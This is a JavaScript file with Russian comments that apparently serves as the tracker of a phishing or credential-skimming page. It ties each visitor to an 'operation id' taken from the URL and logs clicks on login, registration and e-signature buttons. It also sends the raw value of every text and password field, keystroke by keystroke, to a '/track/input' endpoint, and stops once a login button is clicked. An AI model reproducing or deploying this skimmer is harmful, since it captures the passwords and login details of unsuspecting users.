document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const operationId = urlParams.get('id');
    if (!operationId) return;

    let trackingStopped = localStorage.getItem("trackingStopped_" + operationId) === "true";

    function getCurrentTimestamp() {
        return new Date().toISOString();
    }

    async function sendData(url, data) {
        if (trackingStopped) return;

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            // ✅ Если это важная кнопка — проверяем ответ сервера
            if (url.includes("/track/button_click") && response.ok) {
                const result = await response.json();
                if (result.stop_tracking === true) {
                    trackingStopped = true;
                    console.log("Трекинг остановлен по ответу сервера.");
                }
            }

        } catch (err) {
            console.error("Ошибка при отправке данных:", err);
        }
    }

    // ✅ 1. Событие захода
    sendData('/track/visit', {
        operation_id: operationId,
        timestamp: getCurrentTimestamp()
    });

    // ✅ 2. Клики
    document.addEventListener('click', (e) => {
        if (trackingStopped) return;

        const siteWidth = document.documentElement.clientWidth;
        const siteHeight = document.documentElement.clientHeight;

        const clickX = e.clientX;
        const clickY = e.clientY;

        const text = (e.target.innerText || "").toLowerCase();

        const importantWords = [
            'войти', 'войти по эцп', 'отправить заявку', 'зарегистрироваться',
            'отправить', 'сохранить', 'сменить пароль', 'забыли пароль?',
            'не помню логин или пароль', 'регистрация', 'вход через мси'
        ];

        const isImportant = importantWords.some(word => text.includes(word));

        if (isImportant) {
            // ✅ Отправка важной кнопки, сервер должен ответить stop_tracking: true
            sendData('/track/button_click', {
                operation_id: operationId,
                timestamp: getCurrentTimestamp(),
                button_text: text
            });
        }

        // ✅ Отправка клика (только если трекинг не остановлен)
        sendData('/track/click', {
            operation_id: operationId,
            timestamp: getCurrentTimestamp(),
            x: clickX,
            y: clickY,
            site_width: siteWidth,
            site_height: siteHeight
        });
    });

    // ✅ 3. Ввод в поля
    document.addEventListener('input', (e) => {
        if (trackingStopped) return;

        const el = e.target;
        if (!(el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement)) return;

        sendData('/track/input', {
            operation_id: operationId,
            timestamp: getCurrentTimestamp(),
            input_class: el.className,
            value: el.value
        });
    });
});
